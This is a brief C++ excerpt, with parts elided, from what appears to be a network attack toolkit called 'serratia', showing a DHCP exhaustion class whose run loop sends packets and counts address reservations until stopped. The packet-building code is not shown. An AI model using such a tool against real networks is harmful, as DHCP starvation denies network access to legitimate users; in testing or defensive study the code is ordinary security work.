...
void serratia::attacks::DHCPExhaustion::run() {
  ...
  while (true == running_.load()) {
    ...
    send_dev_->send(packet);
    reservation_count_++;
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
  }
}

void serratia::attacks::DHCPExhaustion::stop() { running_.store(false); }

std::uint32_t serratia::attacks::DHCPExhaustion::get_reservation_count() const { return reservation_count_; }
